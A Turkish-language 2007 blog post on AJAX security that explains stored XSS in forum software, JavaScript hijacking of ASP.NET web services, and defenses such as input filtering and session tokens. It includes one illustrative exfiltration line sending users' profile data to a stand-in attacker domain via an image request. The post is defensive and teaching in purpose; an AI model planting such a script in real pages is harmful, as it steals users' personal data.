# AJAX ve Güvenlik Sorunları
**AJAX** artık neredeyse her web projesinde kullanılır oldu. Bazı
projelerde ufak noktalarda kendini gösteren AJAX yeni nesil projelerde
ise neredeyse tüm iş katmanına yayılmış durumda. Bu noktada maalesef
AJAX'ın getirdiği heyecanın kısmi sersemliği ile güvenlik konusunda
kaygılar unutulmuş durumda. Oysa eskiden beridir **XSS
(Cross-Site-Scripting)** bizim JavaScript tarafındaki en önemli
düşmanlarımızdan. Ne kadar ilginçtir ki AJAX'ın göbeğinde de JavaScript
bulunuyor.

**XSS yeni bir güvenlik sorunu değil ki!?**

Kesinlikle değil. Cross-Site-Scripting uzun süredir bilinen, tanınan ve
koruma yöntemleri geliştirilmiş bir sorun. Fakat **XSS**'in yaratacağı
sorunlar AJAX ile binlerce kat büyüyor. Nasıl mı oluyor? Hemen bir örnek
üzerinden gidelim. Varsayalım bir forum uygulaması programlıyorsunuz ve
kullanıcıların attıkları mesajların içeriğini kontrol etmiyorsunuz.
Ziyaretçilerden biri mesajının arasına kendi hazırlamış olduğu
JavaScript kodunu yerleştirdi ve mesajı yolladı. Mesajı direk sitede
gösterdiğinizi varsayalım (Kötü bir programcısınız :)). Söz konusu
kullanıcının gönderdiği JavaScript kodu tüm kullanıcıların
bilgisayarında çalışacaktır. Bu noktada basit bir saldırı tipi olarak
uygun JavaScript kodu ile o sayfaya giren tüm kullanıcıların başka bir
adrese yönlendirilmesinden bahsedebiliriz (**fishing**). Forumunuzda
mesajların gönderimi ve gösterimi için AJAX kullandığınızı varsayalım.
Kullandığınız AJAX kodu, yani JavaScript kodunuz tüm kullanıcılara
gidiyor ve kaynak içerisinde incelenebiliyor. Biraz önce bahsettiğimiz
"kötü ziyaretçi" sizin AJAX metodlarınızı kullanarak forumunuza mesaj
atan bir JavaScript fonksiyonu yazarak mesajına eklerse neler olur?
Mesajın gözüktüğü sayfayı açan herkes o JavaScript metodunu çalıştırmış
olur böylece bir anda forumunuzdaki her kullanıcının yüzlerce mesaj
atması gibi bir durumla karşılaşabilirsiniz. Tüm bu işlem AJAX tarafında
yapıldığı için de kimse farkına varmayacaktır.

Aynı forum uygulamamızla ilgili başka bir durumdan bahsedelim. Forum
uygulamasını programlarken kullanıcıların bilgilerini de
değiştirebilecekleri bir sayfa hazırladınız. Tüm kullanıcıları bilgileri
AJAX ile sayfaya yerleşiyor ve kaydedilebiliyor. Tabi ki tüm bu AJAX
metodlarınız foruma mesaj atılan ve mesajların gösterildiği metodlar ile
sayfada yer alıyor. Kötü kullanıcı Şerafettin :) sitenizde
kullanıcıların bilgilerini profil sayfasına yerleştiren, yani
veritabanından çeken AJAX metodlarını kullanan bir JavaScript komutu
yazarak mesajına ekleyip gönderdi. Her kullanıcı forumda gezerken
Şerafettin'in yazdığı kod söz konusu kullanıcının bilgileri alacak. Peki
sonra ne yapacak? Bu bilgisi aşağıdaki gibi klasik bir teknikle kendi
sitesine aktaracak :)

<span> (<span style="color: blue;">new</span> Image()).src = <span
style="color: rgb(163, 21, 21);">
"http://serafettin.com/bilgigeldi.php?data="</span> +
ProfilBilgisi;</span>

Gözümüzün önünde tüm kullanıcıların profil bilgileri Şerafettin'in
mesajının bulunduğu sayfaya girdikleri gibi elden gidiyor.

XSS'i engellemek, yani kullanıcıların web sitenize gönderdiği içeriği
filtrelemek için **Microsoft** tarafından **ASP.NET** geliştiricileri
için hazırlanmış olan [**Anti-Cross Site
Script**](http://www.microsoft.com/downloads/details.aspx?familyid=9a2b9c92-7ad9-496c-9a89-af08de2e5982&displaylang=en)
kütüphanesini kullanabilirsiniz.

**JavaScript Hijacking**

Bir diğer AJAX sorunlarıdan biri de sitemiz dahilindeki AJAX
metodlarının başka sitelerde de kullanılabilmesi. Eğer AJAX
metodlarınızı harici bir JavaScript dosyasına yerleştirerek sayfanıza
linklediyseniz aynı linklemeyi başka siteler de yapabilir. Farklı alan
adları arasında XMLHttpRequest objelerinin çalışmaması ile ilgili
güvenlik düzenlemeleri olmasına karşın bu durumla ilgili herhangi bir
düzenleme yapmak pek mümkün değil.

<span style="color: blue;"> \<</span><span
style="color: rgb(163, 21, 21);">script</span><span> <span
style="color: red;"> language</span><span
style="color: blue;">="javascript"</span> <span style="color: red;">
src</span><span
style="color: blue;">="http://www.deneme.com/WebService.asmx/js"\>\</</span><span
style="color: rgb(163, 21, 21);">script</span><span
style="color: blue;">\></span></span>

Yukarıdaki kodu kullanarak deneme.com sitesinde kullanılmak üzere
hazırlanmış JavaScript metodlarını herhangi bir sitede, sayfada
kullanabilirsiniz. Dikkat ederseniz özellikle örnek içerisinde
**ScriptService** özelliğine sahip bir ASP.NET web servisi kullandım.
Bizim genelde ASP.NET AJAX tarafında sayfamıza linklediğimiz harici AJAX
metodları web servislerinde yer alıyor.\

Peki bu güvenlik açığına karşı ne yapabiliriz? Herhangi birşey yapmanız
gerekmiyor :) Microsoft bu açığı öngörmüş ve HTTP GET metodlarını web
metodlarına kapatmış. Yukarıdaki kod kullanılarak yapılacak bir talep
GET metodu ile yapılacaktır, herhangi bir şekilde POST metodu ile
yapılması mümkün değil. Siz web methodlarınıza **UseHttpGet:=True**
özelliği vermediğiniz sürece herhangi bir sorun olmayacaktır.

**Sonuç**

Benim tavsiyem AJAX kullanırken özellikle veri alımında, yani
veritabanına kaydedilecek veriyi kullanıcıdan alırken kullandığınız
tekniklerde dikkatli davranmanız. Eğer **Forms Authentication**
kullanıyorsanız web servislerinizi de korumaya almanızda fayda var. Tüm
bu tekniklerin haricinde sunucu taraflı sistem yükü fazla olsa da
Session bazlı ID'ler tanımlayarak sayfanızdaki AJAX işlemlerine gerçek
zamanlı parametre olarak ekleyerek gelen taleplerin sizin sisteminizden
gelip gelmediğini de kontrol edebilirsiniz. Son olarak XSS'e karşı
korunmayı da unutmayın.\



*Bu yazi http://daron.yondem.com adresinde, 2007-4-20 tarihinde yayinlanmistir.*
